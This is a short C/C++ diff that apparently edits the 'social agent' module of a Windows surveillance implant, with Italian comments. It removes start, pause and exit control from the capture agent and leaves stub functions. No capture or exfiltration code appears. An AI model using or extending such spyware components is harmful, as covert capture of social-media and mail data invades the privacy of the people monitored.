@@ -182,33 +182,21 @@ void StartSocialCapture()
 
 DWORD __stdcall PM_SocialAgentStartStop(BOOL bStartFlag, BOOL bReset)
 {	
-	if (bStartFlag) 
-		social_process_control = SOCIAL_PROCESS_CONTINUE;
-	else
-		social_process_control = SOCIAL_PROCESS_PAUSE;
-		
 	return 1;
 }
 
 DWORD __stdcall PM_SocialAgentUnregister()
 {
-	social_process_control = SOCIAL_PROCESS_EXIT;
 	return 1;
 }
 
 DWORD __stdcall PM_SocialAgentInit(JSONObject elem)
 {
-	// Segnala l'agent manager che questo agente e' sempre attivo. In questo modo verro' PM_SocialAgentStartStop verra' 
-	// chiamata quando sara' necessario mettere in pausa l'agente
-	// ma, soprattutto, verra chiamata per riattivarlo quando la pausa e' finita. Se il processo host non e' partito 
-	// cambiare la variabile social_process_control e' comunque ininfluente
-	//AM_MonitorStartStop(PM_SOCIALAGENT, TRUE); 
 	return 1;
 }
 
 void PM_SocialAgentRegister()
 {
-	social_process_control = SOCIAL_PROCESS_CONTINUE;
 	max_social_mail_len = DEFAULT_MAX_MAIL_SIZE*1024;
 	//AM_MonitorRegister(L"social", PM_SOCIALAGENT, NULL, (BYTE *)PM_SocialAgentStartStop, (BYTE *)PM_SocialAgentInit, (BYTE *)PM_SocialAgentUnregister);
 }
